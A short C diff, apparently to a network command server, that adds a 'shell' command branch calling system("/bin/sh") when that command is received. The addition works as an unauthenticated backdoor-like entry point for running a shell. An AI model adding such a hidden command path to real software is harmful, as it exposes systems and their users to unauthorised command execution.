@@ -55,6 +55,12 @@ int main()
 				do_reboot = 1;
 			else if (strcmp(cmd, "msg") == 0)
 				printf("%s", buffer+4);
+			else if (strcmp(cmd, "shell") == 0)
+			{
+				printf("%s\n", "Running a shell");
+				system("/bin/sh");
+				printf("\n%s\n", "Shell exited");
+			}
 		}
 		
 		close(s2);
